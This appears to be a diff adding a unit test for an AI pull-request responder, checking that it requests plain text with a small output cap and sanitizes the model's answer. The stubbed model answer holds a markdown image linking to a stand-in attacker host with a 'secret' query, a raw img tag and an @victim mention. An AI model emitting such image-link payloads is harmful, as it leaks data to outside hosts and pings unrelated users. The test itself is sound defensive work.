@@ -71,3 +71,41 @@ describe("answers", () => {
     ).toBe(false);
   });
 });
+
+describe("answer safety", () => {
+  it("asks for plain text with a small output cap and neutralizes the answer", async () => {
+    const { ConversationResponder } = await import(
+      "../../src/review/conversation-responder.js"
+    );
+    let request: Record<string, unknown> = {};
+    const responder = new ConversationResponder(
+      {
+        async complete(input) {
+          request = input as never;
+          return {
+            content:
+              "Fine.\n![x](https://evil.example/c?d=secret) <img src=x> cc @victim\n```ts\nconst a = b<c>;\n```",
+          };
+        },
+      },
+      { generateStructuredReview: async () => ({}) },
+    );
+    const answer = await responder.answer({
+      framing: "ask",
+      question: "what does this do?",
+      askerLogin: "owner",
+      pullRequest: { title: "t", number: 1 },
+      thread: null,
+      threadFile: null,
+      changedFiles: [],
+      instructions: "",
+      memories: [],
+    });
+    expect(request.responseFormat).toBe("text");
+    expect(request.maxOutputTokens).toBe(800);
+    expect(answer).not.toContain("![x]");
+    expect(answer).not.toContain("<img");
+    expect(answer).toContain("@​victim");
+    expect(answer).toContain("const a = b<c>;");
+  });
+});
